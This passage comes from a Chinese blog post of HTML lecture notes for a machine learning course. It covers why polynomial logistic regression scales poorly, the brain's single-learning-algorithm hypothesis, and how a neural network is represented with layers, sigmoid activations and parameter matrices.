不是一个好的做法 而且由于项数过多 最后的结果很有可能是<strong>过拟合</strong>的 此外 在处理这么多项时 也存在运算量过大的问题</p><p>当然 你也可以试试 只包含上边<strong>这些二次项的子集</strong> 例如 我们只考虑 x1^2 x2^2 x3^2直到 x100^2 这些项 这样就可以将二次项的数量大幅度减少 减少到只有100个二次项 但是由于 忽略了太多相关项 在处理类似左上角的数据时 不可能得到理想的结果 实际上 如果只考虑x1的平方 到x100的平方 这一百个二次项 那么你可能会 拟合出一些特别的假设 比如可能拟合出 一个<strong>椭圆状的曲线</strong> 但是肯定不能拟合出 像左上角这个数据集的分界线</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181110234746.png" alt></p><p>所以5000个二次项看起来已经很多了 而现在假设 包括三次项 或者三阶项 例如x1 x2 x3 x1^2 x2 x10 x11 x17等等 类似的三次项有很多很多 事实上 三次项的个数是以n^3的量级增加 当n=100时 可以计算出来 最后能得到 大概17000个三次项 所以 当初始特征个数n增大时 这些高阶多项式项数 将以几何级数递增 特征空间也随之急剧膨胀 当特征个数n很大时 如果找出附加项 来建立一些分类器 这并不是一个好做法</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181110234949.png" alt></p><p>对于<strong>许多实际的机器学习问题 特征个数n是很大的</strong> 举个例子 关于计算机视觉中的一个问题 假设你想要 使用机器学习算法 来训练一个分类器 使它检测一个图像 来<strong>判断图像是否为一辆汽车</strong></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181110235108.png" alt></p><p>很多人可能会好奇 这对计算机视觉来说有什么难的 当我们自己看这幅图像时 里面有什么是一目了然的事情 你肯定会很奇怪 为什么学习算法竟可能会不知道 图像是什么</p><p>为了解答这个疑问 我们取出这幅图片中的一小部分 将其放大 比如图中 这个红色方框内的部分 结果表明 当人眼看到一辆汽车时 计算机实际上看到的却是这个 一个数<code>据矩阵</code> 或像这种格网 它们表示了<code>像素强度值</code> 告诉我们 <strong>图像中每个像素的亮度值</strong> 因此 对于计算机视觉来说问题就变成了 <strong>根据这个像素点亮度矩阵 来告诉我们 这些数值代表一个汽车门把手</strong></p><p>具体而言 当用机器学习算法构造 一个<code>汽车识别器时</code> 我们要想出 一个带标签的样本集 其中一些样本 是各类汽车 另一部分样本 是其他任何东西 将这个样本集输入给学习算法 以训练出一个<code>分类器</code> 训练完毕后 我们输入一幅新的图片 让分类器判定 “这是什么东西？”</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181110235348.png" alt></p><p>理想情况下 分类器能识别出这是一辆汽车</p><p>为了理解引入 <strong>非线性分类器的必要性</strong> 我们从学习算法的<code>训练样本</code>中 挑出一些汽车图片 和一些非汽车图片</p><p>让我们从其中 每幅图片中挑出一组像素点 这是像素点1的位置 这是像素点2的位置 在坐标系中标出这幅汽车的位置 <strong>在某一点上 车的位置取决于 像素点1和像素点2的亮度</strong></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181110235648.png" alt></p><p>让我们用同样的方法标出其他图片中汽车的位置 然后我们再举一个 关于汽车的不同的例子 观察这<strong>两个相同的像素位置</strong> 这幅图片中 像素1有一个像素强度 像素2也有一个不同的像素强度 所以在这幅图中它们两个处于不同的位置</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181110235814.png" alt></p><p>我们继续画上两个非汽车样本 这个不是汽车 这个也不是汽车 然后我们继续 在坐标系中画上更多的新样本</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111000301.png" alt></p><p>用’’+”表示汽车图片 用“-”表示非汽车图片 我们将发现 汽车样本和非汽车样本 分布在坐标系中的不同区域 因此 我们现在需要一个 非线性分类器 来尽量分开这两类样本</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111000343.png" alt></p><p>这个分类问题中<strong>特征空间的维数</strong>是多少？ 假设我们用50*50像素的图片 我们的图片已经很小了 长宽只各有50个像素 但这依然是2500个像素点 因此 我们的特征向量的元素数量 N=2500 特征向量X 包含了所有像素点的亮度值 这是像素点1的亮度 这是像素点2的亮度 如此类推 直到最后一个 像素点的亮度</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111000517.png" alt></p><p>对于典型的计算机图片表示方法 如果存储的是每个像素点的<code>灰度值 (色彩的强烈程度)</code> 那么<strong>每个元素的值 应该在0到255之间</strong> 因此 这个问题中n=2500 但是 这只是使用灰度图片的情况 如果我们用的是<code>RGB彩色图像</code> 每个像素点包含<code>红、绿、蓝</code>三个子像素 那么n=7500</p><p>因此 如果我们非要 通过包含所有的二次项 来解决这个非线性问题 那么 这就是式子中的所有条件 <code>xi x xj</code>(笛卡尔积) 连同开始的2500像素 总共大约有300万个（(2500^2)/2） 这数字大得有点离谱了 对于每个样本来说 要发现并表示 所有这300万个项 这计算成本太高了</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111000710.png" alt></p><p>因此 只是简单的增加 二次项或者三次项 之类的逻辑回归算法 并不是一个解决<code>复杂非线性问题</code>的好办法 因为当n很大时 将会产生非常多的<code>特征项</code> 在接下来的视频课程中 我将为大家讲解神经网络 它在解决复杂的非线性分类问题上 被证明是 是一种好得多的算法 即使你输入特征空间 或输入的特征维数n很大也能轻松搞定</p><h3 id="小小的总结–非线性假设"><a href="#小小的总结–非线性假设" class="headerlink" title="小小的总结–非线性假设"></a>小小的总结–非线性假设</h3><p>我们之前学的，无论是线性回归还是逻辑回归都有这样一个缺点，即：当特征太多时，计算的负荷会非常大。</p><p>下面是一个例子：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110314.png" alt></p><p>当我们使用$x_1$, $x_2$ 的多次项式进行预测时，我们可以应用的很好。<br>之前我们已经看到过，使用非线性的多项式项，能够帮助我们建立更好的分类模型。假设我们有非常多的特征，例如大于100个变量，我们希望用这100个特征来构建一个非线性的多项式模型，结果将是数量非常惊人的特征组合，即便我们只采用两两特征的组合$(x_1x_2+x_1x_3+x_1x_4+...+x_2x_3+x_2x_4+...+x_{99}x_{100})$，我们也会有接近5000个组合而成的特征。这对于一般的逻辑回归来说需要计算的特征太多了。</p><p>假设我们希望训练一个模型来识别视觉对象（例如识别一张图片上是否是一辆汽车），我们怎样才能这么做呢？一种方法是我们利用很多汽车的图片和很多非汽车的图片，然后利用这些图片上一个个像素的值（饱和度或亮度）来作为特征。</p><p>假如我们只选用灰度图片，每个像素则只有一个值（而非 <strong>RGB</strong>值），我们可以选取图片上的两个不同位置上的两个像素，然后训练一个逻辑回归算法利用这两个像素的值来判断图片上是否是汽车：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110325.png" alt></p><p>假使我们采用的都是50x50像素的小图片，并且我们将所有的像素视为特征，则会有 2500个特征，如果我们要进一步将两两特征组合构成一个多项式模型，则会有约${{2500}^{2}}/2$个（接近3百万个）特征。普通的逻辑回归模型，不能有效地处理这么多的特征，这时候我们需要神经网络。</p><h2 id="8-2-神经元和大脑-Neurons-and-the-Brain"><a href="#8-2-神经元和大脑-Neurons-and-the-Brain" class="headerlink" title="8.2 神经元和大脑(Neurons and the Brain)"></a>8.2 神经元和大脑(Neurons and the Brain)</h2><p><code>神经网络</code>是一种很古老的算法 它最初产生的目的是 制造能模拟大脑的机器 在这门课中 我将向你们介绍神经网络 因为它能很好地解决 不同的机器学习问题 而不只因为它们在逻辑上行得通</p><p>在本节课中 告诉你们一些神经网络的背景知识 由此我们能知道可以用它们来做什么 不管是将其应用到现代的机器学习问题上 还是应用到那些你可能会感兴趣的问题中 也许这一伟大的人工智能梦想在未来能制造出真正的智能机器</p><p>另外 我们还将讲解神经网络是怎么涉及这些问题的</p><p><strong>神经网络产生的原因</strong> 是人们想尝试设计出 模仿大脑的算法 从某种意义上说如果我们 想要建立学习系统 那为什么不去模仿 我们所认识的最神奇的学习机器——-人类的大脑呢 神经网络逐渐兴起于 二十世纪八九十年代 应用得非常广泛 但由于各种原因 在90年代的后期应用减少了 但是最近 神经网络 又东山再起了</p><p>其中一个原因是 <strong>神经网络是计算量有些偏大的算法</strong> 然而 大概由于近些年 <strong>计算机的运行速度变快才足以真正运行起大规模的神经网络</strong> 正是由于这个原因 和其他一些我们后面会讨论到的 技术因素 如今的神经网络 对于许多应用来说是最先进的技术</p><p>当你想模拟大脑时 是指想制造出与人类大脑 作用效果相同的机器 对吧？ 大脑可以学会去 以看而不是听的方式处理图像 学会处理我们的触觉 我们能学习数学  学着做微积分 而且大脑能处理 各种不同的令人惊奇的事情 似乎如果你想要 模仿它 你得写很多不同的 软件来模拟所有 大脑告诉我们的这些 五花八门的奇妙的事情 不过能不能假设 大脑做所有这些 不同事情的方法 不需要用上千个不同的程序去实现 相反的 大脑处理的方法 只需要 一个单一的学习算法就可以了？ 尽管这只是一个假设 不过让我和你分享 一些这方面的证据</p><p>大脑的这一部分 这一小片红色区域 是你的听觉皮层 你现在正在理解我的话 这靠的是耳朵 耳朵接收到声音信号 并把声音信号传递给你的 听觉皮层 正因如此 你才能明白我的话</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111001739.png" alt></p><p>神经系统科学家做了 下面这个有趣的实验 把 <strong>耳朵到听觉皮层的神经切断</strong> 在这种情况下 将其重新接到一个动物的大脑上 这样从眼睛到 视神经的信号最终将传到听觉皮层</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111001936.png" alt></p><p>如果这样做了 那么结果表明 听觉皮层将会 学会“看” 这里“看”代表了 我们所知道的每层含义 所以 如果你对动物这样做 那么动物就可以完成视觉辨别任务 它们可以看图像 并根据图像做出适当的决定 它们正是通过 脑组织中的这个部分完成的</p><p>来看另一个例子</p><p>这块红色的脑组织是你的<code>躯体感觉皮层</code> 这是你用来<strong>处理触觉</strong>的 如果你做一个和刚才类似的重接实验 那么躯体感觉皮层也能学会”看“ 这个实验和其它一些 类似的实验 被称为<code>神经重接实验</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111002127.png" alt></p><p>从这个意义上说 如果 人体有同一块 脑组织可以处理光、 声或触觉信号 那么也许存在一种学习算法 可以同时处理 视觉、听觉和触觉 而不是需要 运行上千个不同的程序 或者上千个不同的算法来做这些 大脑所完成的 成千上万的美好事情 也许我们需要做的就是找出 一些近似的或 实际的大脑学习算法 然后实现它 大脑通过自学掌握如何 处理这些不同类型的数据</p><p>在很大的程度上 可以猜想如果我们 把几乎任何一种传感器 接入到大脑的 几乎任何一个部位的话 大脑就会学会处理它</p><p>下面再举几个例子 左上角的这张图是 用舌头学会“看”的一个例子 它的原理是 这实际上是 一个名为BrainPort的系统 它现在正在FDA (美国食品和药物管理局) 的临床试验阶段 它能帮助失明人士看见事物 它的原理是 你在前额上带一个灰度摄像头 面朝前 它就能 获取你面前事物的 低分辨率的灰度图像 你连一根线 到舌头上安装的 电极阵列上 那么每个像素都被映射到 你舌头的 某个位置上 可能电压值高的点对应一个 暗像素 电压值低的点 对应于亮像素 即使依靠 它现在的功能 使用这种系统就能让你我 在几十分钟里就学会 用我们的舌头“看”东西</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111002341.png" alt></p><p>这是第二个例子 关于人体回声定位或者说人体声纳 你有两种方法可以实现 你可以弹响指 或者咂舌头 这个我做不好 不过现在有失明人士 确实在学校里 接受这样的培训 并学会解读 从环境反弹回来的声波模式—这就是<code>声纳</code> 如果你搜索 YouTube之后 就会发现 有些视频讲述了一个令人称奇的孩子 他因为癌症眼球惨遭移除 虽然失去了眼球 但是通过打响指 他可以四处走动而不撞到任何东西 他能滑滑板 他可以将篮球投入篮框中 注意这是一个没有眼球的孩子</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111002434.png" alt></p><p>第三个例子是 触觉皮带 如果你把它 戴在腰上 蜂鸣器会响 而且总是朝向北时发出嗡嗡声 它可以使人拥有 方向感 用类似于 鸟类感知方向的方式 还有一些离奇的例子 如果你在青蛙身上 插入第三只眼 青蛙也能学会使用那只眼睛</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111002728.png" alt></p><p>因此 这将会非常令人惊奇 如果你能 把几乎任何传感器 接入到大脑中 大脑的学习算法就能 找出学习数据的方法 并处理这些数据</p><p>从某种意义上来说 如果我们能找出 大脑的学习算法 然后在计算机上执行 大脑学习算法或与之相似的算法 也许 这将是我们 向人工智能迈进 做出的最好的尝试 人工智能的梦想就是 有一天能制造出真正的智能机器</p><p>当然我不是 教神经网络的 介绍它只因为它可能为我们 打开一扇进入遥远的 人工智能梦的窗户 对于我个人来说 它也是我研究生涯中致力于的一个项目 但我在这节课中 讲授神经网络的原因 主要是对于 现代机器学习应用 它是最有效的技术方法 因此在接下来的 一些课程中 我们将开始深入到 神经网络的技术细节 那么你就可以 将它们应用到现代 机器学习的应用中 并利用它们很好地解决问题 但对我来说 使我兴奋的原因之一 就是它或许能 给我们一些启示 让我们知道 当我们在思考 未来有什么样的算法 能以与人类相似的方式学习时 我们能做些什么</p><h3 id="小小的总结–神经元和大脑"><a href="#小小的总结–神经元和大脑" class="headerlink" title="小小的总结–神经元和大脑"></a>小小的总结–神经元和大脑</h3><p>神经网络是一种很古老的算法，它最初产生的目的是制造能模拟大脑的机器。</p><p>在这门课中，我将向你们介绍神经网络。因为它能很好地解决不同的机器学习问题。而不只因为它们在逻辑上行得通，在这段视频中，我想告诉你们一些神经网络的背景知识，由此我们能知道可以用它们来做什么。不管是将其应用到现代的机器学习问题上，还是应用到那些你可能会感兴趣的问题中。也许，这一伟大的人工智能梦想在未来能制造出真正的智能机器。另外，我们还将讲解神经网络是怎么涉及这些问题的神经网络产生的原因是人们想尝试设计出模仿大脑的算法，从某种意义上说如果我们想要建立学习系统，那为什么不去模仿我们所认识的最神奇的学习机器——人类的大脑呢？</p><p>神经网络逐渐兴起于二十世纪八九十年代，应用得非常广泛。但由于各种原因，在90年代的后期应用减少了。但是最近，神经网络又东山再起了。其中一个原因是：神经网络是计算量有些偏大的算法。然而大概由于近些年计算机的运行速度变快，才足以真正运行起大规模的神经网络。正是由于这个原因和其他一些我们后面会讨论到的技术因素，如今的神经网络对于许多应用来说是最先进的技术。当你想模拟大脑时，是指想制造出与人类大脑作用效果相同的机器。大脑可以学会去以看而不是听的方式处理图像，学会处理我们的触觉。</p><p>我们能学习数学，学着做微积分，而且大脑能处理各种不同的令人惊奇的事情。似乎如果你想要模仿它，你得写很多不同的软件来模拟所有这些五花八门的奇妙的事情。不过能不能假设大脑做所有这些，不同事情的方法，不需要用上千个不同的程序去实现。相反的，大脑处理的方法，只需要一个单一的学习算法就可以了？尽管这只是一个假设，不过让我和你分享，一些这方面的证据。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110410.png" alt></p><p>大脑的这一部分这一小片红色区域是你的听觉皮层，你现在正在理解我的话，这靠的是耳朵。耳朵接收到声音信号，并把声音信号传递给你的听觉皮层，正因如此，你才能明白我的话。</p><p>神经系统科学家做了下面这个有趣的实验，把耳朵到听觉皮层的神经切断。在这种情况下，将其重新接到一个动物的大脑上，这样从眼睛到视神经的信号最终将传到听觉皮层。如果这样做了。那么结果表明听觉皮层将会学会“看”。这里的“看”代表了我们所知道的每层含义。所以，如果你对动物这样做，那么动物就可以完成视觉辨别任务，它们可以看图像，并根据图像做出适当的决定。它们正是通过脑组织中的这个部分完成的。下面再举另一个例子，这块红色的脑组织是你的躯体感觉皮层，这是你用来处理触觉的，如果你做一个和刚才类似的重接实验，那么躯体感觉皮层也能学会“看”。这个实验和其它一些类似的实验，被称为神经重接实验，从这个意义上说，如果人体有同一块脑组织可以处理光、声或触觉信号，那么也许存在一种学习算法，可以同时处理视觉、听觉和触觉，而不是需要运行上千个不同的程序，或者上千个不同的算法来做这些大脑所完成的成千上万的美好事情。也许我们需要做的就是找出一些近似的或实际的大脑学习算法，然后实现它大脑通过自学掌握如何处理这些不同类型的数据。在很大的程度上，可以猜想如果我们把几乎任何一种传感器接入到大脑的几乎任何一个部位的话，大脑就会学会处理它。</p><p>下面再举几个例子：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110425.png" alt></p><p>这张图是用舌头学会“看”的一个例子。它的原理是：这实际上是一个名为<strong>BrainPort</strong>的系统，它现在正在<strong>FDA</strong><br>(美国食品和药物管理局)的临床试验阶段，它能帮助失明人士看见事物。它的原理是，你在前额上带一个灰度摄像头，面朝前，它就能获取你面前事物的低分辨率的灰度图像。你连一根线到舌头上安装的电极阵列上，那么每个像素都被映射到你舌头的某个位置上，可能电压值高的点对应一个暗像素电压值低的点。对应于亮像素，即使依靠它现在的功能，使用这种系统就能让你我在几十分钟里就学会用我们的舌头“看”东西。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110436.png" alt></p><p>这是第二个例子，关于人体回声定位或者说人体声纳。你有两种方法可以实现：你可以弹响指，或者咂舌头。不过现在有失明人士，确实在学校里接受这样的培训，并学会解读从环境反弹回来的声波模式—这就是声纳。如果你搜索<strong>YouTube</strong>之后，就会发现有些视频讲述了一个令人称奇的孩子，他因为癌症眼球惨遭移除，虽然失去了眼球，但是通过打响指，他可以四处走动而不撞到任何东西，他能滑滑板，他可以将篮球投入篮框中。注意这是一个没有眼球的孩子。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110451.png" alt></p><p>第三个例子是触觉皮带，如果你把它戴在腰上，蜂鸣器会响，而且总是朝向北时发出嗡嗡声。它可以使人拥有方向感，用类似于鸟类感知方向的方式。</p><p>还有一些离奇的例子：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110458.png" alt></p><p>如果你在青蛙身上插入第三只眼，青蛙也能学会使用那只眼睛。因此，这将会非常令人惊奇。如果你能把几乎任何传感器接入到大脑中，大脑的学习算法就能找出学习数据的方法，并处理这些数据。从某种意义上来说，如果我们能找出大脑的学习算法，然后在计算机上执行大脑学习算法或与之相似的算法，也许这将是我们向人工智能迈进做出的最好的尝试。人工智能的梦想就是：有一天能制造出真正的智能机器。</p><p>神经网络可能为我们打开一扇进入遥远的人工智能梦的窗户，但我在这节课中讲授神经网络的原因，主要是对于现代机器学习应用。它是最有效的技术方法。因此在接下来的一些课程中，我们将开始深入到神经网络的技术细节。</p><h2 id="8-3-模型表示1-Model-Representation-1"><a href="#8-3-模型表示1-Model-Representation-1" class="headerlink" title="8.3 模型表示1(Model Representation 1)"></a>8.3 模型表示1(Model Representation 1)</h2><p>在这个视频中 我想 开始向你介绍 我们该如何表示神经网络 换句话说 当我们在 <strong>运用神经网络时 我们该如何表示我们的假设或模型</strong> 神经网络是在模仿 大脑中的<code>神经元</code>或者<code>神经网络</code>时发明的 因此 要解释如何表示 模型假设 我们先来看<strong>单个神经元在大脑中是什么样的</strong></p><p>我们的大脑中充满了 这样的神经元 <code>神经元</code>是大脑中的细胞 其中有两点 值得我们注意 一是神经元有 像这样的<code>细胞主体</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111003137.png" alt></p><p>二是神经元有 一定数量的 输入神经 这些<strong>输入神经</strong>叫做<code>树突</code> 可以把它们想象成输入电线 它们<strong>接收来自其他神经元的信息</strong></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111003418.png" alt></p><p>神经元的<strong>输出神经</strong>叫做<code>轴突</code> 这些输出神经 是用来 <strong>给其他神经元传递信号 或者传送信息的</strong></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111003515.png" alt></p><p>简而言之 <strong><code>神经元</code>是一个计算单元 它从输入神经接受一定数目的信息 并做一些计算 然后将结果通过它的 轴突传送到其他节点 或者大脑中的其他神经元</strong></p><p>下面是一组神经元的示意图 神经元利用微弱的电流 进行沟通 这些弱电流也称作<code>动作电位</code> 其实就是一些微弱的电流</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111004603.png" alt></p><p>所以如果 <strong>神经元想要传递一个消息</strong> 它就会就通过它的<code>轴突</code> 发送一段微弱电流 给其他神经元 这就是<code>轴突</code> 这里是一条 连接到<code>输入神经</code> 或者连接<code>另一个神经元树突的神经</code> 接下来这个神经元接收这条消息 做一些计算 它有可能会反过来将 在轴突上的 自己的消息传给其他神经元</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111004853.png" alt></p><p>这就是所有 人类思考的模型： <strong>我们的神经元把自己的收到的消息进行计算,并向其他神经元 传递消息</strong></p><p>顺便说一下 这也是 我们的感觉和肌肉运转的原理 如果你想活动一块肌肉 就会触发一个神经元 给你的肌肉 发送<code>脉冲</code> 并引起 你的肌肉收缩 如果一些感官 比如说眼睛 想要给大脑传递 一个消息 那么它就像这样发送 电脉冲给大脑的</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111005109.png" alt></p><p>在一个神经网络里 或者说在我们在电脑上 实现的人工神经网络里 我们将使用 一个非常简单的模型 来模拟神经元的工作 我们<strong>将神经元模拟成一个逻辑单元</strong> 当我画一个这样的 黄色圆圈时 你应该 把它想象成 作用类似于 神经元的东西 然后我们通过 它的树突或者说它的输入神经 传递给它一些信息 然后神经元做一些计算 并通过它的输出神经 即它的轴突 输出计算结果</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111005426.png" alt></p><p>当我画一个像这样的图表时 就表示对h(x)的计算 <strong>h(x)等于1除以1加e的负θ转置乘以x</strong> 通常 x和θ 是我们的参数向量 这是一个简单的模型 甚至说是一个过于简单的 模拟神经元的模型 它被输入 x1 x2和 x3 然后输出一些 类似这样的结果</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111005728.png" alt></p><p>当我绘制一个神经网络时 通常我只绘制 输入节点 x1 x2 x3 但有时也可以这样做： 我增加一个额外的节点 x0 这个 x0 节点 有时也被称作<code>偏置单位</code> 或<code>偏置神经元</code> 但因为 x0 总是等于1 所以有时候 我会画出它 有时我不会画出 这取决于它是否对例子有利</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111005901.png" alt></p><p>现在来讨论 最后一个关于 神经网络的术语 有时我们会说 这是一个神经元 <strong>一个有s型函数或者<code>逻辑函数</code>作为激励函数的 <code>人工神经元</code></strong> 在神经网络术语中 <code>激励函数</code><strong>只是对类似非线性函数g(z)的另一个术语称呼</strong> g(z)等于 <strong>1除以1加e的-z次方</strong></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111010225.png" alt></p><p>到目前为止 我一直称<code>θ</code>为<code>模型的参数</code> 以后大概会继续将这个术语与 “参数”相对应 而不是与在关于神经网络的文献里 有时你可能会看到人们 谈论一个模型的<code>权重</code> <strong>权重其实和模型的参数 是一样的东西</strong> 在视频中 我会继续使用“参数”这个术语 但有时你可能听到别人用“权重”这个术语</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111010347.png" alt></p><p>以上的黄色小圈，代表<strong>一个单一的神经元</strong></p><p><code>神经网络</code>其实就是下图这些不同的神经元组合在一起的<strong>集合</strong></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111010504.png" alt></p><p>具体来说 这里是我们的 输入单元 x1 x2和 x3 再说一次 有时也可以画上 额外的节点 x0 我把 x0 画在这了 里有 3个神经元 我在里面写了a(2)1 a(2)2 和a(2)3 然后再次说明 我们可以在这里 添加一个a0 和一个额外的<code>偏度单元</code> <strong>它的值永远是1</strong> 最后 我们在 最后一层有第三个节点 正是这第三个节点 输出 <strong>假设函数h(x)计算的结果</strong></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111010613.png" alt></p><p>再多说一点关于 神经网络的术语 网络中的第一层 也被称为<code>输入层</code> 因为我们在这一层 输入我们的特征项 x1 x2 x3 最后一层 也称为<code>输出层</code> 因为这一层的 神经元—我指的这个 输出 假设的最终计算结果 中间的两层 也被称作<code>隐藏层</code> 隐藏层不是一个 很合适的术语 但是 直觉上我们知道 在监督学习中 你能看到输入 也能看到正确的输出 而隐藏层的值 你在训练集里是看不到的 它的值不是 x 也不是y 所以我们叫它<code>隐藏层</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111010832.png" alt></p><p>稍后我们会看到神经网络 可以有不止一个的 隐藏层 但在 这个例子中 我们有一个 输入层—第1层 一个隐藏层— 第2层 和一个输出层—第3层 但实际上任何 <strong>非输入层或非输出层的层</strong>就被称为<code>隐藏层</code></p><p>接下来 我希望你们明白神经网络 究竟在做什么 让我们逐步分析 这个图表所呈现的 计算步骤</p><p>为了解释这个神经网络 具体的计算步骤 这里还有些记号要解释 我要使用<code>a上标(j)下标i</code>表示 <strong>第j层的第i个神经元或单元</strong> 具体来说 这里 a上标(2) 下标1 表示第2层的 第一个激励 即隐藏层的第一个激励 所谓<code>激励(activation)</code> 是指 <strong>由一个具体神经元读入计算并输出的值</strong></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111011256.png" alt></p><p>此外 我们的神经网络 被这些矩阵参数化 <code>θ上标(j)</code> 它将成为 一个<code>波矩阵</code> 控制着 比如说 从第一层到第二层 或者 第二层到第三层的作用</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111011414.png" alt></p><p>所以 这就是这张图所表示的计算</p><p>这里的第一个隐藏单元 是这样计算它的值的： a(2)1等于 s函数（或者说s激励函数，也叫做逻辑激励函数） 作用在这种 输入的线性组合上的结果</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111011643.png" alt></p><p>第二个隐藏单元 等于s函数作用在这个 线性组合上的值 同样 对于第三个 隐藏的单元 它是通过这个公式计算的</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111011746.png" alt></p><p>在这里 我们有三个 输入单元和三个隐藏单元</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111011904.png" alt></p><p>这样一来 参数矩阵控制了 我们来自 三个输入单元 三个隐藏单元的映射 因此θ1的维数 将变成3 θ1将变成一个 3乘4维的 矩阵 <strong>因为x0是偏度单元，它的值永远是1,所以变成3X4,不要a(2)0是因为它在计算下一层的时候用到,这一层不需要计算它</strong></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111012412.png" alt></p><p>更一般的 如果一个网络在第j 层有sj个单元 在j+1层有 sj+1个单元 那么矩阵θ(j) 即控制第j层到 第j+1层映射 的矩阵的 维度为s(j+1) * (sj+1) 这里要搞清楚 这个是s下标j+1 而这个是 s下标j 然后 整体加上1 整体加1 明白了吗 所以θ(j)的维度是 s(j+1)行 sj+1列 这里sj+1 当中的1 不是下标的一部分</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111233445.png" alt></p><p>以上我们讨论了 三个隐藏单位是怎么计算它们的值</p><p>最后 在输出层 我们还有一个 单元 它计算 <code>h(x)</code> 这个也可以 写成a(3)1 就等于后面这块</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181111234313.png" alt></p><p>注意到我这里 写了个上标2 因为θ上标2 是<code>参数矩阵</code>，或着说是<code>权重矩阵</code>。该矩阵<strong>控制从第二层（即隐藏层的3个单位） 到第三层的一个单元 （即输出单元） 的<code>映射</code></strong></p><p>总之 以上我们 展示了像这样一张图是 怎样定义 一个人工神经网络的 这个神经网络定义了函数h： 从输入 x 到输出y的映射 我将这些假设的参数 记为大写的θ 这样一来 不同的θ 对应了不同的假设 所以我们有不同的函数 比如说从 x到y的映射 以上就是我们怎么 从数学上定义 神经网络的假设</p><p>在接下来的视频中 我想要做的就是 让你对这些假设的作用 有更深入的理解 并且讲解几个例子 然后谈谈如何有效的计算它们 【教育无边界字幕组】翻译人员不详</p><h3 id="小小的总结–模型表示"><a href="#小小的总结–模型表示" class="headerlink" title="小小的总结–模型表示"></a>小小的总结–模型表示</h3><p>为了构建神经网络模型，我们需要首先思考大脑中的神经网络是怎样的？每一个神经元都可以被认为是一个处理单元/神经核（<strong>processing unit</strong>/<strong>Nucleus</strong>），它含有许多输入/树突（<strong>input</strong>/<strong>Dendrite</strong>），并且有一个输出/轴突（<strong>output</strong>/<strong>Axon</strong>）。神经网络是大量神经元相互链接并通过电脉冲来交流的一个网络。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110558.png" alt></p><p>下面是一组神经元的示意图，神经元利用微弱的电流进行沟通。这些弱电流也称作动作电位，其实就是一些微弱的电流。所以如果神经元想要传递一个消息，它就会就通过它的轴突，发送一段微弱电流给其他神经元，这就是轴突。</p><p>这里是一条连接到输入神经，或者连接另一个神经元树突的神经，接下来这个神经元接收这条消息，做一些计算，它有可能会反过来将在轴突上的自己的消息传给其他神经元。这就是所有人类思考的模型：我们的神经元把自己的收到的消息进行计算，并向其他神经元传递消息。这也是我们的感觉和肌肉运转的原理。如果你想活动一块肌肉，就会触发一个神经元给你的肌肉发送脉冲，并引起你的肌肉收缩。如果一些感官：比如说眼睛想要给大脑传递一个消息，那么它就像这样发送电脉冲给大脑的。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110610.png" alt></p><p>神经网络模型建立在很多神经元之上，每一个神经元又是一个个学习模型。这些神经元（也叫激活单元，<strong>activation unit</strong>）采纳一些特征作为输出，并且根据本身的模型提供一个输出。下图是一个以逻辑回归模型作为自身学习模型的神经元示例，在神经网络中，参数又可被成为权重（<strong>weight</strong>）。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213110629.png" 